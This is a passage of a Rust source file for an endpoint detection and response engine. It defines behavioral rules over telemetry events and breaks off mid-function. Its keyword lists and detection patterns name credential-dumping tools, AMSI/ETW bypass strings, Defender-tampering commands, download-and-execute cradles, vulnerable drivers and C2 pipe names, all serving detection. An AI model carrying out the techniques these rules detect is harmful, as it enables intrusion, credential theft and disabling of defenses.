//! Real-time behavioral and telemetry EDR detection rules.
//!
//! Evaluates enriched raw telemetry events (`telemetry_stream::EdrEventRecord`)
//! and network flows (`edr_feedback::NetworkFlowRecord`) locally without
//! dropping or rate-limiting the underlying lossless telemetry stream.

use std::collections::HashMap;
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant};

use serde_json::Value;

use crate::edr_feedback::{
    BehaviorTelemetryPayload, NetworkFlowRecord, get_machine_guid, send_threat_alert,
    stream_behavior_telemetry_async,
};
use crate::logging::Logging;
use crate::telemetry_stream::EdrEventRecord;

const DEDUP_WINDOW: Duration = Duration::from_secs(60);
const DEDUP_MAX_ENTRIES: usize = 4096;
const SANCTUM_PID_TTL: Duration = Duration::from_secs(600);
const SANCTUM_PID_CAP: usize = 4096;

static ALERT_DEDUP: OnceLock<Mutex<HashMap<(String, u32, String), Instant>>> = OnceLock::new();
static SANCTUM_DETECTED_PIDS: OnceLock<Mutex<HashMap<u32, Instant>>> = OnceLock::new();

/// Records that Sanctum flagged a suspicious or hostile behavior for `pid`.
pub fn record_sanctum_detection(pid: u32) {
    if pid <= 4 {
        return;
    }
    let cache = SANCTUM_DETECTED_PIDS.get_or_init(|| Mutex::new(HashMap::new()));
    let Ok(mut map) = cache.lock() else {
        return;
    };
    let now = Instant::now();
    if map.len() >= SANCTUM_PID_CAP {
        map.retain(|_, ts| now.duration_since(*ts) < SANCTUM_PID_TTL);
        if map.len() >= SANCTUM_PID_CAP {
            map.clear();
        }
    }
    map.insert(pid, now);
}

/// Returns whether Sanctum flagged `pid` within the active detection TTL.
pub fn is_pid_sanctum_detected(pid: u32) -> bool {
    if pid == 0 {
        return false;
    }
    let Some(cache) = SANCTUM_DETECTED_PIDS.get() else {
        return false;
    };
    let Ok(mut map) = cache.lock() else {
        return false;
    };
    let Some(ts) = map.get(&pid).copied() else {
        return false;
    };
    if Instant::now().duration_since(ts) < SANCTUM_PID_TTL {
        true
    } else {
        map.remove(&pid);
        false
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RuleSeverity {
    Medium,
    High,
    Critical,
}

impl RuleSeverity {
    pub const fn risk_score(self) -> f32 {
        match self {
            Self::Medium => 0.60,
            Self::High => 0.85,
            Self::Critical => 1.00,
        }
    }

    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Medium => "medium",
            Self::High => "high",
            Self::Critical => "critical",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EdrRuleHit {
    pub rule_id: &'static str,
    pub rule_name: &'static str,
    pub mitre: &'static str,
    pub severity: RuleSeverity,
    pub event_type: String,
    pub pid: u32,
    pub process_name: String,
    pub exe_path: String,
    pub sha256: String,
    pub subject: String,
    pub summary: String,
    pub indicators: Vec<String>,
}

const BYOVD_DRIVER_FILES: &[&str] = &[
    "iqvw64e.sys",
    "rtcore64.sys",
    "rtcore32.sys",
    "dbutil_2_3.sys",
    "dbutildrv2.sys",
    "procexp152.sys",
    "gdrv.sys",
    "aswarpot.sys",
    "mhyprot2.sys",
    "zam64.sys",
    "zamguard64.sys",
    "truesight.sys",
    "bs_def64.sys",
    "capcom.sys",
    "speedfan.sys",
    "winring0x64.sys",
    "winring0.sys",
    "phymemx64.sys",
    "kprocesshacker.sys",
    "processhacker.sys",
    "ene.sys",
    "atszio64.sys",
    "glckio2.sys",
    "msio64.sys",
    "asio64.sys",
    "viragt64.sys",
    "echo_driver.sys",
    "k7rkscan.sys",
];

const SECURITY_DRIVER_FILES: &[&str] = &[
    "edrdrv.sys",
    "wdfilter.sys",
    "sysmondrv.sys",
    "windivert",
    "sanctum.sys",
    "sanctum_elam.sys",
    "mbrfilter.sys",
    "hyperhv.sys",
    "reddbgdrv.sys",
];

const USER_WRITABLE_DIRS: &[&str] = &[
    "\\temp\\",
    "\\appdata\\",
    "\\users\\public\\",
    "\\downloads\\",
];

const LOLBIN_OR_SHELL_NAMES: &[&str] = &[
    "powershell",
    "pwsh",
    "cmd.exe",
    "cmd /c",
    "cmd /k",
    "mshta",
    "wscript",
    "cscript",
    "rundll32",
    "regsvr32",
    "certutil",
    "bitsadmin",
];

const SIDELOAD_HOSTS: &[&str] = &[
    "rundll32.exe",
    "regsvr32.exe",
    "mshta.exe",
    "wscript.exe",
    "cscript.exe",
    "svchost.exe",
    "lsass.exe",
    "winlogon.exe",
    "spoolsv.exe",
    "dllhost.exe",
    "msiexec.exe",
    "certutil.exe",
    "installutil.exe",
    "msbuild.exe",
    "cmstp.exe",
    "odbcconf.exe",
];

const TRUSTED_REMOTE_THREAD_CALLERS: &[&str] = &[
    "svchost.exe",
    "csrss.exe",
    "services.exe",
    "wininit.exe",
    "lsass.exe",
    "smss.exe",
    "edrsvc.exe",
    "explorer.exe",
    "taskmgr.exe",
    "msiexec.exe",
    "trustedinstaller.exe",
    "tiworker.exe",
    "devenv.exe",
    "vsdbg.exe",
];

const SENSITIVE_REMOTE_THREAD_TARGETS: &[&str] = &[
    "lsass.exe",
    "svchost.exe",
    "explorer.exe",
    "winlogon.exe",
    "spoolsv.exe",
    "edrsvc.exe",
    "chrome.exe",
    "msedge.exe",
    "firefox.exe",
    "notepad.exe",
    "dllhost.exe",
    "werfault.exe",
    "conhost.exe",
];

const OFFENSIVE_SERVICE_NAMES: &[&str] = &["psexesvc", "paexec", "remcomsvc", "csexecsvc"];

const MALICIOUS_PIPE_PREFIXES: &[&str] = &[
    "\\msagent_",
    "\\postex_",
    "\\psexesvc",
    "\\remcom_",
    "\\paexec_",
    "\\csexecsvc",
    "\\meterpreter",
    "\\gruntsvc",
    "\\sliver_",
    "\\lsadump",
    "\\cachedump",
    "\\wceservicepipe",
    "\\ahexec",
    "\\badpotato",
    "\\godpotato",
    "\\juicypotato",
    "\\sweetpotato",
    "\\efspotato",
    "\\printspoofer",
];

/// Curated malware/C2-specific TLS JA3 & JA3S fingerprints sourced from Emerging Threats & Abuse.ch SSLBL.
const MALICIOUS_TLS_FINGERPRINTS: &[(&str, &str)] = &[
    ("eb88d0b3e1961a0562f006e5ce2a0b87", "CobaltStrike.MalleableC2"),
    ("ae4edc6faf64d08308082ad26be60767", "CobaltStrike.Server.JA3S"),
    ("aa29d305dff6e6ac9cd244a62c6ad0c2", "CobaltStrike.Server.JA3S"),
    ("8916410db85077a5460817142dcbc8de", "Metasploit.Meterpreter"),
    ("72a589da586844d7f0818ce684948eea", "Metasploit.Meterpreter"),
    ("e564ee1b7bcae4467d8c759df910ed9c", "DeimosC2.Agent"),
    ("f4febc55ea12b31ae17cfb7e614afda8", "DeimosC2.Agent"),
    ("f6dfdd25d1522e4e1c7cd09bd37ce619", "RustyBuer.Server.JA3S"),
    ("16f17c896273d1d098314a02e87dd4cb", "Metasploit.HttpScanner"),
    ("950ccdd64d360a7b24c70678ac116a44", "Metasploit.CcsScanner"),
    ("ee031b874122d97ab269e0d8740be31a", "Metasploit.HeartbleedScanner"),
    ("6825b330bf9de50ccc8745553cb61b2f", "Metasploit.SslScanner"),
    ("1aa7bf8b97e540ca5edd75f7b8384bfa", "AbuseCh.Trickbot"),
    ("e62a5f4d538cbf169c2af71bec2399b4", "AbuseCh.Trickbot"),
    ("fb00055a1196aeea8d1bc609885ba953", "AbuseCh.Trickbot"),
    ("c50f6a8b9173676b47ba6085bd0c6cee", "AbuseCh.Trickbot"),
    ("3cda52da4ade09f1f781ad2e82dcfa20", "AbuseCh.QakBot"),
    ("7dd50e112cd23734a310b90f6f44a7cd", "AbuseCh.QakBot"),
    ("51c64c77e60f3980eea90869b68c58a8", "AbuseCh.Dridex"),
    ("cb98a24ee4b9134448ffb5714fd870ac", "AbuseCh.Dridex"),
    ("b386946a5a44d1ddcc843bc75336dfce", "AbuseCh.Dridex"),
    ("d6f04b5a910115f4b50ecec09d40a1df", "AbuseCh.Dridex"),
    ("57f3642b4e37e28f5cbe3020c9331b4c", "AbuseCh.Gozi"),
    ("c201b92f8b483fa388be174d6689f534", "AbuseCh.Gozi"),
    ("1be3ecebe5aa9d3654e6e703d81f6928", "AbuseCh.Troldesh"),
    ("1712287800ac91b34cadd5884ce85568", "AbuseCh.TorrentLocker"),
    ("c5235d3a8b9934b7fbbd204d50bc058d", "AbuseCh.Gootkit"),
    ("decfb48a53789ebe081b88aabb58ee34", "AbuseCh.Adwind"),
];

pub fn lookup_malicious_tls_fingerprint(hash: &str) -> Option<&'static str> {
    let trimmed = hash.trim();
    if trimmed.len() != 32 {
        return None;
    }
    MALICIOUS_TLS_FINGERPRINTS
        .iter()
        .find(|(fp, _)| fp.eq_ignore_ascii_case(trimmed))
        .map(|(_, label)| *label)
}

fn basename_lower(path: &str) -> String {
    path.rsplit(['\\', '/'])
        .next()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase()
}

fn first_str_by_pointers(raw: &Value, pointers: &[&str]) -> String {
    for ptr in pointers {
        if let Some(s) = raw.pointer(ptr).and_then(|v| v.as_str()) {
            let trimmed = s.trim();
            if !trimmed.is_empty() && trimmed != "<undefined>" && trimmed != "null" {
                return trimmed.to_string();
            }
        }
    }
    String::new()
}

fn collect_fields_text(raw: &Value, pointers: &[&str], details: Option<&str>) -> String {
    let mut parts = Vec::new();
    for ptr in pointers {
        if let Some(s) = raw.pointer(ptr).and_then(|v| v.as_str()) {
            let t = s.trim();
            if !t.is_empty() && t != "<undefined>" && t != "null" {
                parts.push(t);
            }
        }
    }
    if let Some(d) = details {
        let t = d.trim();
        if !t.is_empty() {
            parts.push(t);
        }
    }
    parts.join(" | ")
}

fn extract_sha256(raw: &Value) -> String {
    first_str_by_pointers(
        raw,
        &["/hashes/sha256", "/process/imageFile/hash", "/file/hash"],
    )
}

fn contains_any(haystack_lower: &str, needles: &[&str]) -> bool {
    needles.iter().any(|n| haystack_lower.contains(n))
}

fn has_word_token(haystack_lower: &str, token: &str) -> bool {
    let mut start = 0usize;
    while let Some(rel) = haystack_lower[start..].find(token) {
        let idx = start + rel;
        let before_ok = idx == 0
            || !haystack_lower.as_bytes()[idx - 1].is_ascii_alphanumeric();
        let after_idx = idx + token.len();
        let after_ok = after_idx >= haystack_lower.len()
            || !haystack_lower.as_bytes()[after_idx].is_ascii_alphanumeric();
        if before_ok && after_ok {
            return true;
        }
        start = idx + token.len();
    }
    false
}

fn make_hit(
    rec: &EdrEventRecord,
    rule_id: &'static str,
    rule_name: &'static str,
    mitre: &'static str,
    severity: RuleSeverity,
    subject: String,
    summary: String,
    mut indicators: Vec<String>,
) -> EdrRuleHit {
    indicators.push(format!("MITRE:{mitre}"));
    indicators.push(format!("RuleId:{rule_id}"));
    EdrRuleHit {
        rule_id,
        rule_name,
        mitre,
        severity,
        event_type: rec.event_type.clone(),
        pid: rec.pid,
        process_name: rec.process_name.clone(),
        exe_path: rec.exe_path.clone(),
        sha256: extract_sha256(&rec.raw),
        subject: if subject.is_empty() {
            rec.exe_path.clone()
        } else {
            subject
        },
        summary,
        indicators,
    }
}

fn evaluate_powershell(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let text = collect_fields_text(
        &rec.raw,
        &["/ScriptBlockText", "/script_block_text"],
        rec.details.as_deref(),
    );
    if text.is_empty() {
        return;
    }
    let low = text.to_ascii_lowercase();
    let subj = rec.exe_path.clone();

    let is_amsi = (low.contains("amsiutils")
        && (low.contains("amsiinitfailed")
            || low.contains("amsicontext")
            || low.contains("amsiscanbuffer")))
        || (low.contains("etweventwrite")
            && (low.contains("virtualprotect") || low.contains("marshal::copy")))
        || low.contains("system.management.automation.amsiutils");
    if is_amsi {
        out.push(make_hit(
            rec,
            "PS-001",
            "EDR.PowerShell.AmsiOrEtwBypass",
            "T1562.001",
            RuleSeverity::Critical,
            subj.clone(),
            "PowerShell ScriptBlock attempted AMSI/ETW tampering".to_string(),
            vec!["ScriptBlock:AMSI/ETW bypass pattern".to_string()],
        ));
    }

    let is_reflective = ((low.contains("[system.reflection.assembly]::load(")
        || low.contains("assembly]::load("))
        && (low.contains("frombase64string") || low.contains("downloaddata")))
        || (low.contains("virtualalloc")
            && (low.contains("createthread")
                || low.contains("marshal::copy")
                || low.contains("getdelegateforfunctionpointer")));
    if is_reflective {
        out.push(make_hit(
            rec,
            "PS-002",
            "EDR.PowerShell.ReflectiveOrMemoryLoader",
            "T1059.001",
            RuleSeverity::Critical,
            subj.clone(),
            "PowerShell ScriptBlock contains reflective/in-memory payload loader".to_string(),
            vec!["ScriptBlock:Reflective memory loader".to_string()],
        ));
    }

    let is_creds = contains_any(
        &low,
        &[
            "invoke-mimikatz",
            "sekurlsa::",
            "logonpasswords",
            "lsadump::",
            "get-gpppassword",
            "invoke-kerberoast",
            "rubeus",
        ],
    ) || (low.contains("comsvcs.dll") && low.contains("minidump"));
    if is_creds {
        out.push(make_hit(
            rec,
            "PS-003",
            "EDR.PowerShell.CredentialAccess",
            "T1003",
            RuleSeverity::Critical,
            subj.clone(),
            "PowerShell ScriptBlock contains credential dumping signature".to_string(),
            vec!["ScriptBlock:Credential access tooling".to_string()],
        ));
    }

    let is_tamper = ((low.contains("set-mppreference") || low.contains("add-mppreference"))
        && (low.contains("-disablerealtimemonitoring")
            || low.contains("-disablebehaviormonitoring")
            || low.contains("-exclusionpath c:\\")))
        || ((low.contains("stop-service")
            || low.contains("sc.exe delete")
            || low.contains("sc delete"))
            && (low.contains("edrsvc")
                || low.contains("windefend")
                || low.contains("edrdrv")));
    if is_tamper {
        out.push(make_hit(
            rec,
            "PS-004",
            "EDR.PowerShell.SecurityDefenseTamper",
            "T1562.001",
            RuleSeverity::Critical,
            subj.clone(),
            "PowerShell ScriptBlock attempted to disable antivirus/EDR defenses".to_string(),
            vec!["ScriptBlock:Security defense tampering".to_string()],
        ));
    }

    let has_iex = has_word_token(&low, "iex") || low.contains("invoke-expression");
    let has_cradle = contains_any(
        &low,
        &[
            "downloadstring",
            "downloaddata",
            "invoke-webrequest",
            "invoke-restmethod",
            "net.webclient",
            "frombase64string",
        ],
    );
    if has_iex && has_cradle {
        out.push(make_hit(
            rec,
            "PS-005",
            "EDR.PowerShell.DownloadCradleExec",
            "T1059.001",
            RuleSeverity::High,
            subj,
            "PowerShell ScriptBlock combined dynamic download/decode cradle with IEX".to_string(),
            vec!["ScriptBlock:Download/Decode + Invoke-Expression".to_string()],
        ));
    }
}

fn evaluate_process_tampering(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let technique = first_str_by_pointers(&rec.raw, &["/technique"]);
    let reason = first_str_by_pointers(&rec.raw, &["/reason"]);
    let img = first_str_by_pointers(&rec.raw, &["/image_path"]);
    let subject = if img.is_empty() { rec.exe_path.clone() } else { img };
    let mut indicators = Vec::new();
    if !technique.is_empty() {
        indicators.push(format!("Technique:{technique}"));
    }
    if !reason.is_empty() {
        indicators.push(format!("Reason:{reason}"));
    }
    out.push(make_hit(
        rec,
        "PROC-001",
        "EDR.Process.TamperingDetected",
        "T1055.012",
        RuleSeverity::Critical,
        subject.clone(),
        format!("Process image tampering detected for {subject}"),
        indicators,
    ));
}

fn evaluate_wmi(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let text = collect_fields_text(
        &rec.raw,
        &[
            "/command",
            "/CommandLineTemplate",
            "/script",
            "/ScriptText",
            "/consumer",
            "/class",
            "/Operation",
        ],
        rec.details.as_deref(),
    );
    if text.is_empty() {
        return;
    }
    let low = text.to_ascii_lowercase();
    let is_susp = contains_any(&low, LOLBIN_OR_SHELL_NAMES)
        || contains_any(&low, USER_WRITABLE_DIRS)
        || low.contains("\\programdata\\")
        || low.contains("activescripteventconsumer")
        || low.contains("vbscript")
        || low.contains("jscript");
    if is_susp {
        out.push(make_hit(
            rec,
            "WMI-001",
            "EDR.WMI.SuspiciousPermanentConsumer",
            "T1546.003",
            RuleSeverity::High,
            first_str_by_pointers(&rec.raw, &["/consumer", "/command", "/CommandLineTemplate"]),
            "WMI permanent event subscription references suspicious shell/script consumer".to_string(),
            vec![format!("WMI:{text}")],
        ));
    }
}

fn evaluate_bits(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let text = collect_fields_text(
        &rec.raw,
        &[
            "/url",
            "/RemoteName",
            "/file",
            "/LocalName",
            "/command",
            "/NotifyCmdLine",
            "/job_title",
            "/jobTitle",
        ],
        rec.details.as_deref(),
    );
    if text.is_empty() {
        return;
    }
    let low = text.to_ascii_lowercase();
    const BITS_EXTS: &[&str] = &[
        ".exe", ".dll", ".ps1", ".bat", ".cmd", ".vbs", ".hta", ".msi", ".scr", ".jar",
    ];
    let has_ext = BITS_EXTS.iter().any(|ext| low.contains(ext));
    let has_notify = contains_any(&low, &["notify", "setnotifycmdline", "bitsadmin", "powershell"]);
    if has_ext || has_notify {
        out.push(make_hit(
            rec,
            "BITS-001",
            "EDR.BITS.SuspiciousTransferOrNotify",
            "T1197",
            RuleSeverity::High,
            first_str_by_pointers(&rec.raw, &["/url", "/RemoteName", "/LocalName"]),
            "BITS job transferred executable/script payload or configured notification command".to_string(),
            vec![format!("BITS:{text}")],
        ));
    }
}

fn evaluate_scheduled_task(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let text = collect_fields_text(
        &rec.raw,
        &["/task_name", "/TaskName", "/command", "/arguments", "/TaskContent"],
        rec.details.as_deref(),
    );
    if text.is_empty() {
        return;
    }
    let low = text.to_ascii_lowercase();
    let is_susp = contains_any(&low, LOLBIN_OR_SHELL_NAMES)
        || contains_any(&low, USER_WRITABLE_DIRS)
        || low.contains("encodedcommand")
        || low.contains("-enc ");
    if is_susp {
        let task = first_str_by_pointers(&rec.raw, &["/task_name", "/TaskName"]);
        out.push(make_hit(
            rec,
            "TASK-001",
            "EDR.ScheduledTask.SuspiciousCommandOrPath",
            "T1053.005",
            RuleSeverity::High,
            task,
            "Scheduled task creation/modification invokes LOLBin or user-writable path".to_string(),
            vec![format!("ScheduledTask:{text}")],
        ));
    }
}

fn evaluate_service(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let svc_name = first_str_by_pointers(&rec.raw, &["/service_name", "/ServiceName"]);
    let text = collect_fields_text(
        &rec.raw,
        &["/service_name", "/ServiceName", "/value_data", "/ImagePath", "/image_path", "/binary_path"],
        rec.details.as_deref(),
    );
    if text.is_empty() {
        return;
    }
    let low = text.to_ascii_lowercase();
    let svc_low = svc_name.to_ascii_lowercase();
    let offensive_name = OFFENSIVE_SERVICE_NAMES.iter().any(|s| svc_low.contains(s));
    let is_susp = offensive_name
        || contains_any(&low, LOLBIN_OR_SHELL_NAMES)
        || contains_any(&low, USER_WRITABLE_DIRS);
    if is_susp {
        out.push(make_hit(
            rec,
            "SVC-001",
            "EDR.Service.SuspiciousBinaryPath",
            "T1543.003",
            RuleSeverity::High,
            svc_name,
            "Windows service configured with suspicious binary path or offensive service name".to_string(),
            vec![format!("Service:{text}")],
        ));
    }
}

fn evaluate_driver(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let path = first_str_by_pointers(
        &rec.raw,
        &[
            "/driver_path",
            "/driver/image",
            "/file/rawPath",
            "/file/abstractPath",
            "/file/path",
        ],
    );
    let text = if path.is_empty() {
        rec.details.clone().unwrap_or_default()
    } else {
        path.clone()
    };
    let low = text.to_ascii_lowercase();
    let file_base = basename_lower(&path);

    let sub_type = first_str_by_pointers(&rec.raw, &["/subType"]);
    let drv_action = first_str_by_pointers(&rec.raw, &["/driver/action"]);
    if sub_type.eq_ignore_ascii_case("HVCI_BLOCK") || drv_action.eq_ignore_ascii_case("BLOCK") {
        evaluate_sanctum_hvci_block(rec, out);
        return;
    }

    if rec.event_type == "DRIVER_UNLOADED" {
        if SECURITY_DRIVER_FILES
            .iter()
            .any(|d| file_base == *d || low.contains(d))
        {
            out.push(make_hit(
                rec,
                "DRV-002",
                "EDR.Driver.SecurityDriverUnloaded",
                "T1562.001",
                RuleSeverity::Critical,
                text.clone(),
                format!("Security or packet filter driver unloaded: {text}"),
                vec![format!("DriverUnloaded:{text}")],
            ));
        }
        return;
    }

    let is_byovd = BYOVD_DRIVER_FILES
        .iter()
        .any(|d| file_base == *d || low.contains(d));
    let is_writable_path = contains_any(&low, USER_WRITABLE_DIRS);
    if is_byovd || is_writable_path {
        out.push(make_hit(
            rec,
            "DRV-001",
            "EDR.Driver.BYOVDVulnerableLoaded",
            "T1068",
            RuleSeverity::Critical,
            text.clone(),
            format!("Known vulnerable BYOVD or user-writable kernel driver observed: {text}"),
            vec![format!("Driver:{text}")],
        ));
    }
}

fn evaluate_named_pipe(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let pipe_path = first_str_by_pointers(
        &rec.raw,
        &["/file/rawPath", "/file/abstractPath", "/file/path", "/pipe_name"],
    );
    let text = if pipe_path.is_empty() {
        rec.details.clone().unwrap_or_default()
    } else {
        pipe_path.clone()
    };
    if text.is_empty() {
        return;
    }
    let low = text.to_ascii_lowercase();
    let matched = MALICIOUS_PIPE_PREFIXES.iter().any(|p| low.contains(p))
        || (low.contains("\\msse-") && low.contains("-server"));
    if matched {
        out.push(make_hit(
            rec,
            "PIPE-001",
            "EDR.NamedPipe.KnownMaliciousC2OrExploit",
            "T1071",
            RuleSeverity::High,
            text.clone(),
            format!("Known malicious C2 or privilege escalation named pipe: {text}"),
            vec![format!("NamedPipe:{text}")],
        ));
    }
}

fn evaluate_remote_thread(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let target_pid = rec
        .raw
        .pointer("/target/pid")
        .or_else(|| rec.raw.pointer("/target/id"))
        .and_then(|v| v.as_u64())
        .and_then(|v| u32::try_from(v).ok())
        .unwrap_or(0);
    if target_pid != 0 && target_pid == rec.pid {
        return;
    }

    let caller_base = basename_lower(if rec.exe_path.is_empty() {
        &rec.process_name
    } else {
        &rec.exe_path
    });
    if caller_base.is_empty() || TRUSTED_REMOTE_THREAD_CALLERS.contains(&caller_base.as_str()) {
        return;
    }

    let target_img = first_str_by_pointers(
        &rec.raw,
        &[
            "/target/imageFile/rawPath",
            "/target/imageFile/path",
            "/target/name",
            "/target_image",
        ],
    );
    let target_base = basename_lower(&target_img);
    if SENSITIVE_REMOTE_THREAD_TARGETS.contains(&target_base.as_str()) {
        out.push(make_hit(
            rec,
            "INJ-001",
            "EDR.RemoteThread.SuspiciousInjection",
            "T1055.003",
            RuleSeverity::High,
            target_img.clone(),
            format!("Untrusted process {caller_base} created remote thread in {target_base}"),
            vec![
                format!("Caller:{caller_base}"),
                format!("Target:{target_base} (PID:{target_pid})"),
            ],
        ));
    }
}

fn evaluate_image_load(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let host_base = basename_lower(if rec.exe_path.is_empty() {
        &rec.process_name
    } else {
        &rec.exe_path
    });
    if !SIDELOAD_HOSTS.contains(&host_base.as_str()) {
        return;
    }
    let img_path = first_str_by_pointers(
        &rec.raw,
        &["/file/rawPath", "/file/abstractPath", "/file/path", "/image_path"],
    );
    let low = img_path.to_ascii_lowercase();
    if low.ends_with(".dll") && contains_any(&low, USER_WRITABLE_DIRS) {
        out.push(make_hit(
            rec,
            "DLL-001",
            "EDR.ImageLoad.SuspiciousDllSideload",
            "T1574.002",
            RuleSeverity::High,
            img_path.clone(),
            format!("System/LOLBin host {host_base} loaded DLL from user-writable path: {img_path}"),
            vec![format!("Host:{host_base}"), format!("LoadedDll:{img_path}")],
        ));
    }
}

fn evaluate_file_downloaded(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let url = first_str_by_pointers(&rec.raw, &["/url", "/host_url", "/HostUrl"]);
    let target = first_str_by_pointers(&rec.raw, &["/target_path", "/path", "/file_path"]);
    let candidate = if !target.is_empty() {
        target.clone()
    } else if !url.is_empty() {
        url.clone()
    } else {
        rec.details.clone().unwrap_or_default()
    };
    if candidate.is_empty() {
        return;
    }

    let check_target = candidate
        .split(['?', '#'])
        .next()
        .unwrap_or(&candidate)
        .to_ascii_lowercase();
    let check_url = url
        .split(['?', '#'])
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();

    let is_double_ext = [
        ".pdf.", ".doc.", ".docx.", ".xls.", ".xlsx.", ".ppt.", ".pptx.", ".txt.", ".jpg.",
        ".jpeg.", ".png.", ".gif.", ".zip.",
    ]
    .iter()
    .any(|doc| {
        (check_target.contains(doc) || check_url.contains(doc))
            && [".exe", ".scr", ".com", ".bat", ".cmd", ".vbs", ".vbe", ".js", ".jse", ".hta", ".msi", ".pif", ".cpl"]
                .iter()
                .any(|ex| check_target.ends_with(ex) || check_url.ends_with(ex))
    });

    const HIGH_RISK_EXTS: &[&str] = &[
        ".hta", ".vbs", ".vbe", ".jse", ".wsf", ".scr", ".pif", ".cpl",
    ];
    const MED_RISK_EXTS: &[&str] = &[
        ".iso", ".vhd", ".vhdx", ".img", ".lnk", ".chm", ".ps1", ".bat", ".cmd",
    ];

    let severity = if is_double_ext
        || HIGH_RISK_EXTS
            .iter()
            .any(|e| check_target.ends_with(e) || check_url.ends_with(e))
    {
        Some(RuleSeverity::High)
    } else if MED_RISK_EXTS
        .iter()
        .any(|e| check_target.ends_with(e) || check_url.ends_with(e))
    {
        Some(RuleSeverity::Medium)
    } else {
        None
    };

    if let Some(sev) = severity {
        out.push(make_hit(
            rec,
            "DL-001",
            "EDR.FileDownload.HighRiskMotwPayload",
            "T1566.002",
            sev,
            candidate.clone(),
            format!("High-risk file download / MOTW payload observed: {candidate}"),
            vec![
                format!("Downloaded:{candidate}"),
                if url.is_empty() {
                    "MOTW:Zone.Identifier".to_string()
                } else {
                    format!("URL:{url}")
                },
            ],
        ));
    }
}

fn evaluate_virtual_disk_mount(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let path = first_str_by_pointers(
        &rec.raw,
        &["/device_path", "/path", "/image_path", "/VhdFileName"],
    );
    let text = if path.is_empty() {
        rec.details.clone().unwrap_or_default()
    } else {
        path
    };
    let low = text.to_ascii_lowercase();
    if contains_any(&low, USER_WRITABLE_DIRS) {
        out.push(make_hit(
            rec,
            "VHD-001",
            "EDR.VirtualDisk.MotwBypassMount",
            "T1553.005",
            RuleSeverity::High,
            text.clone(),
            format!("Virtual disk or ISO image mounted from user-writable folder: {text}"),
            vec![format!("VirtualDisk:{text}")],
        ));
    }
}

fn evaluate_account_or_group(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let is_group_member_add = rec.event_type == "LOCAL_GROUP_MEMBER_ADD"
        || (rec.event_type == "LOCAL_ACCOUNT_MODIFY"
            && first_u64_by_pointers(&rec.raw, &["/event_id"]) == Some(4732));
    if is_group_member_add {
        let text = collect_fields_text(
            &rec.raw,
            &["/group_name", "/TargetUserName"],
            rec.details.as_deref(),
        );
        let low = text.to_ascii_lowercase();
        const PRIV_GROUPS: &[&str] = &[
            "administrators",
            "remote desktop users",
            "backup operators",
            "domain admins",
            "enterprise admins",
        ];
        if PRIV_GROUPS.iter().any(|g| low.contains(g)) {
            out.push(make_hit(
                rec,
                "ACC-001",
                "EDR.Account.PrivilegedGroupAddition",
                "T1098",
                RuleSeverity::High,
                first_str_by_pointers(&rec.raw, &["/group_name", "/TargetUserName"]),
                format!("Account added to privileged group: {text}"),
                vec![format!("GroupChange:{text}")],
            ));
        }
    } else if rec.event_type == "LOCAL_ACCOUNT_CREATE" {
        let acct = first_str_by_pointers(&rec.raw, &["/account_name", "/TargetUserName"]);
        let low = acct.to_ascii_lowercase();
        if low.ends_with('$') || low == "support_388945a0" || low == "helpassistant" {
            out.push(make_hit(
                rec,
                "ACC-002",
                "EDR.Account.HiddenBackdoorUser",
                "T1136.001",
                RuleSeverity::High,
                acct.clone(),
                format!("Suspicious hidden or backdoor local account created: {acct}"),
                vec![format!("Account:{acct}")],
            ));
        }
    }
}

fn evaluate_group_policy(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let text = collect_fields_text(
        &rec.raw,
        &["/registry_path", "/path", "/value_name"],
        rec.details.as_deref(),
    );
    if text.is_empty() {
        return;
    }
    let low = text.to_ascii_lowercase();
    if contains_any(
        &low,
        &[
            "\\policies\\microsoft\\windows defender",
            "scriptblocklogging",
            "enablelua",
            "disableregistrytools",
            "disabletaskmgr",
        ],
    ) {
        out.push(make_hit(
            rec,
            "GPO-001",
            "EDR.GroupPolicy.SecurityDefenseTamper",
            "T1484.001",
            RuleSeverity::High,
            first_str_by_pointers(&rec.raw, &["/registry_path", "/path"]),
            format!("Security-related Group Policy setting modified: {text}"),
            vec![format!("GPO:{text}")],
        ));
    }
}

fn extract_bool_by_pointers(raw: &Value, ptrs: &[&str]) -> bool {
    ptrs.iter().any(|ptr| {
        raw.pointer(ptr).is_some_and(|v| {
            v.as_bool()
                .unwrap_or_else(|| v.as_u64().is_some_and(|n| n != 0))
        })
    })
}

fn first_u64_by_pointers(raw: &Value, ptrs: &[&str]) -> Option<u64> {
    for ptr in ptrs {
        if let Some(v) = raw.pointer(ptr) {
            if let Some(n) = v.as_u64() {
                return Some(n);
            }
            if let Some(s) = v.as_str() {
                let t = s.trim();
                if let Some(hex) = t.strip_prefix("0x").or_else(|| t.strip_prefix("0X")) {
                    if let Ok(n) = u64::from_str_radix(hex, 16) {
                        return Some(n);
                    }
                } else if let Ok(n) = t.parse::<u64>() {
                    return Some(n);
                }
            }
        }
    }
    None
}

fn evaluate_sanctum_ghost_hunt(rec: &EdrEventRecord, out: &mut Vec<EdrRuleHit>) {
    let syscall = first_str_by_pointers(&rec.raw, &["/syscall_name"]);
    let hex_payload = first_str_by_pointers(&rec.raw, &["/hex_payload"]);
    let addr = first_u64_by_pointers(&rec.raw, &["/address"]);
    let subject = if !syscall.is_empty() && !rec.exe_path.is_empty() {
        format!("{} ({syscall})", rec.exe_path)
    } else if !syscall.is_empty() {
